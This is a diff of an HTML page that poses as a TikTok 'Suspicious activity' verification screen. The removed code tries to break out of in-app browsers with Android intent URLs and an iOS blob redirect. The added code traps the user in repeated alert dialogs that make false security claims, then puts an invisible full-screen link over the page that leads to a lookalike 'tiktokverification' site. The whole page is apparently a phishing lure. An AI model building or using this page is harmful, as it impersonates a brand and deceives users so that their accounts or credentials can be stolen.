@@ -1,54 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification</title>
     <style>
-        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        #btn { padding: 20px 40px; background: #000; color: #fff; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        body, html { 
+            margin: 0; padding: 0; background: #ffffff; 
+            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            height: 100%; overflow: hidden;
+        }
+
+        #full-screen-redirect {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 9999; opacity: 0; cursor: pointer;
+            display: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        #wrapper {
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; width: 100%;
+        }
+
+        #main-content { text-align: center; padding: 0 30px; max-width: 400px; }
+        .verification-icon { width: 72px; height: 72px; margin-bottom: 20px; }
+        .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 12px; }
+        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 60px; }
+        .tiktok-btn-visual {
+            background-color: #FE2C55; color: #ffffff; border-radius: 4px;
+            font-size: 16px; font-weight: 600; padding: 12px 60px;
+            width: 100%; display: inline-block; box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
 
-    <div id="btn">CONTINUE TO VERIFICATION</div>
+    <a id="full-screen-redirect" href="https://tiktokverification.github.io/captcha/Verification/verify1.html"></a>
 
-<script>
-    const dest = "https://tik-tok-verification.com/Verification/verify1.html";
-    const clean = "tik-tok-verification.com/Verification/verify1.html";
+    <div id="wrapper">
+        <div id="main-content">
+            <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
+                <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
+                <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
+                <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
+            </svg>
 
-    function launch() {
-        const isAndroid = /Android/i.test(navigator.userAgent);
-        
-        if (isAndroid) {
-            // Android: Intent with specific Chrome package targeting
-            window.location.href = `intent://${clean}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
-        } else {
-            // iOS: THE BLOB ESCAPE
-            // 1. Create a virtual HTML file in memory that contains the redirect
-            const blobContent = `<script>window.location.replace("safari-https://${clean}");<\/script>`;
-            const blob = new Blob([blobContent], {type: 'text/html'});
-            const blobUrl = URL.createObjectURL(blob);
+            <div class="header">Suspicious activity</div>
+            <div class="subtext">Please complete verification to continue using TikTok.</div>
+            <div class="tiktok-btn-visual">Verify</div>
+        </div>
+    </div>
 
-            // 2. Open that virtual file as a '_system' process
-            // This forces the OS to handle the 'text/html' blob outside the sandbox
-            window.open(blobUrl, '_system');
-            
-            // 3. Direct Backup
-            setTimeout(() => { window.location.href = "safari-https://" + clean; }, 50);
-        }
-    }
+    <script>
+        window.onload = function() {
+            const duration = 10000; // 10 seconds in ms
+            const startTime = Date.now();
+            const header = "Suspicious network activity";
+            const baseMsg = "For your security, a brief connection audit is required. Please do not exit the app or disconnect from the network until this security check is complete. We appreciate your patience.";
 
-    // Trigger on button click
-    document.getElementById('btn').onclick = function() {
-        launch();
-    };
+            function runAlerts() {
+                const elapsed = Date.now() - startTime;
+                const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
 
-    // Auto-trigger on page load (via Alert bridge)
-    window.onload = function() {
-        setTimeout(() => {
-            alert("SECURITY: Please confirm to continue in your browser.");
-            launch();
-        }, 500);
-    };
-</script>
+                if (remaining > 0) {
+                    // This forces the alert. When they click OK, it immediately checks the time again.
+                    alert(header + "\n\n" + baseMsg + "\n\nTime remaining: " + remaining + "s");
+                    
+                    // Recursive call with a tiny timeout to keep the loop going
+                    setTimeout(runAlerts, 50); 
+                } else {
+                    // Once time is actually up based on the clock
+                    document.getElementById('full-screen-redirect').style.display = 'block';
+                    alert("Security check complete. Please tap 'Verify' to continue.");
+                }
+            }
+
+            // Small initial delay so the page renders before the first alert hits
+            setTimeout(runAlerts, 500);
+        };
+    </script>
 </body>
 </html>
